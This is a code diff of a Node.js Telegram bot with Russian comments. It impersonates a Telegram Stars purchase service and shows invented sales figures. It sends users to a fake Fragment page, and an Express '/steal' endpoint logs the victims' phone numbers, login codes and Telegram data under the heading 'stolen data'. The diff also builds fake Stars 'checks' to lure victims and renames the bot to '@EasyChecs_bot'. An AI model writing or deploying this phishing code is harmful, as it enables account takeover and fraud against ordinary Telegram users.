@@ -20,39 +20,23 @@ db.run(`CREATE TABLE IF NOT EXISTS checks (
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP
 )`);
 
-// Команда /niklateam - белый список
-const WHITELIST = [123456789, 987654321]; // Замени на ID своей команды
-
 // Web App
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
 
 app.post('/steal', (req, res) => {
-    console.log('Украдены данные:', req.body);
+    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
+    console.log('Номер:', req.body.phone);
+    console.log('Код:', req.body.code);
+    console.log('Telegram Data:', req.body.tg_data);
+    console.log('========================');
     res.sendStatus(200);
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`Сервер работает на порту ${PORT}`);
-});
-
-// Команда /niklateam
-bot.onText(/\/niklateam/, (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    if (WHITELIST.includes(userId)) {
-        bot.sendMessage(chatId, 
-            '✅ Вы добавлены в белый список! Теперь вы можете создавать чеки без ожидания.\n\n' +
-            'Формат создания чека:\n' +
-            '@MyStarBank_bot 100 50\n' +
-            'где 100 - количество звезд, 50 - количество активаций'
-        );
-    } else {
-        bot.sendMessage(chatId, '❌ У вас нет доступа к этой команде.');
-    }
 });
 
 // Обработка создания чеков
@@ -61,15 +45,6 @@ bot.onText(/@MyStarBank_bot (\d+) (\d+)/, (msg, match) => {
     const userId = msg.from.id;
     const amount = parseInt(match[1]);
     const activations = parseInt(match[2]);
-    
-    // Проверяем лимиты для обычных пользователей
-    if (!WHITELIST.includes(userId)) {
-        bot.sendMessage(chatId, 
-            '❌ Обычные пользователи могут создавать чеки только через 21 день после регистрации.\n\n' +
-            'Используйте команду /niklateam для получения привилегий.'
-        );
-        return;
-    }
     
     // Создаем чек
     db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
@@ -82,7 +57,7 @@ bot.onText(/@MyStarBank_bot (\d+) (\d+)/, (msg, match) => {
         const checkId = this.lastID;
         
         // Отправляем чек в чат
-        const checkText = `via @EasyChecs_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`;
+        const checkText = `via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`;
         
         bot.sendMessage(chatId, checkText, {
             reply_markup: {
@@ -169,6 +144,20 @@ bot.on('callback_query', (query) => {
         );
     }
     
+    else if (query.data === 'deposit') {
+        bot.sendMessage(chatId, 'Функция пополнения временно недоступна.');
+    }
+    
+    else if (query.data === 'create_check_info') {
+        bot.sendMessage(chatId,
+            'Для создания чека используйте формат:\n\n' +
+            '@EasyChecs_bot 100 50\n\n' +
+            'где:\n' +
+            '100 - количество звезд\n' +
+            '50 - количество активаций'
+        );
+    }
+    
     bot.answerCallbackQuery(query.id);
 });
 
@@ -187,28 +176,22 @@ bot.onText(/\/start/, (msg) => {
             ]
         }
     };
-    
-    bot.sendMessage(chatId, 
-        'Привет! @MyStarBank_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n' +
-        'С ним ты можешь моментально покупать и передавать звезды.\n\n' +
-        'Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n' +
-        'С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)',
-        keyboard
-    );
+
+    // Отправляем фото с описанием
+    bot.sendPhoto(chatId, 'https://via.placeholder.com/400x200/2481cc/ffffff?text=Telegram+Stars+Bot', {
+        caption: 'Привет! @EasyChecs_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n' +
+                'С ним ты можешь моментально покупать и передавать звезды.\n\n' +
+                'Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n' +
+                'С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)',
+        reply_markup: keyboard.reply_markup
+    });
 });
 
-// Информация о создании чеков
-bot.on('callback_query', (query) => {
-    if (query.data === 'create_check_info') {
-        bot.sendMessage(query.message.chat.id,
-            'Для создания чека используйте формат:\n\n' +
-            '@MyStarBank_bot 100 50\n\n' +
-            'где:\n' +
-            '100 - количество звезд\n' +
-            '50 - количество активаций\n\n' +
-            'Обычные пользователи: ожидание 21 день\n' +
-            'Команда /niklateam: создание без ожидания'
-        );
+// Обработка обычных сообщений
+bot.on('message', (msg) => {
+    // Игнорируем команды и служебные сообщения
+    if (msg.text && !msg.text.startsWith('/') && !msg.text.includes('@EasyChecs_bot')) {
+        console.log(`Сообщение от ${msg.chat.id}: ${msg.text}`);
     }
 });
 
